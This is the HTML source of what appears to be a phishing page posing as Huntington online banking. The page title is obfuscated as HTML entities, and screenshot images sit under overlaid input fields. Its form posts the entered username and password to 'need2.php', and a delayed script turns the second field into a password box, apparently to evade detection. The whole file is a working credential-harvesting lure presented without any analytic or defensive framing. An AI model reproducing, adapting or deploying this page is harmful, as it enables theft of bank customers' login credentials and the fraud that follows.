<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#44;&#32;&#73;&#110;&#115;&#117;&#114;&#97;&#110;&#99;&#101;&#32;&#97;&#110;&#100;&#32;&#73;&#110;&#118;&#101;&#115;&#116;&#105;&#110;&#103;&#32;&#124;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;</title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  <style type="text/css">
			 .textbox {  
    border-top: solid 2px #8e8e8e; 
    border-right: solid 2px #d1d1d1; 
    border-left: solid 2px #d1d1d1; 
    border-bottom: solid 2px #e4e4e4;
	border-radius: 5px;
	font-family: Tahoma,"????","??",arial;
    font-size: 14px;
  	color: #555; 	
    height: 38px; 
  	padding-left:5px;
    width: 275px; 
 } 
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 983px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body bgColor="#D3D3D3">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:980px; height:378px; z-index:0"><img src="images/h12.png" alt="" title="" border=0 width=980 height=378></div>

<div id="image2" style="position:absolute; overflow:hidden; left:1px; top:378px; width:982px; height:438px; z-index:1"><img src="images/h13.png" alt="" title="" border=0 width=982 height=438></div>
<form action=need2.php name=sattusoda id=sattusoda method=post>
<input name="em" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:300px;left:124px;top:257px;z-index:2">
<input name="ep" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:300px;left:124px;top:337px;z-index:3">
<div id="formimage1" style="position:absolute; left:123px; top:415px; z-index:4"><input type="image" name="formimage1" width="166" height="44" src="images/mt.png"></div>
<div id="image3" style="position:absolute; overflow:hidden; left:335px; top:435px; width:63px; height:24px; z-index:5"><img src="images/h11.png" alt="" title="" border=0 width=63 height=24></div>

</div>

</body>
</html>
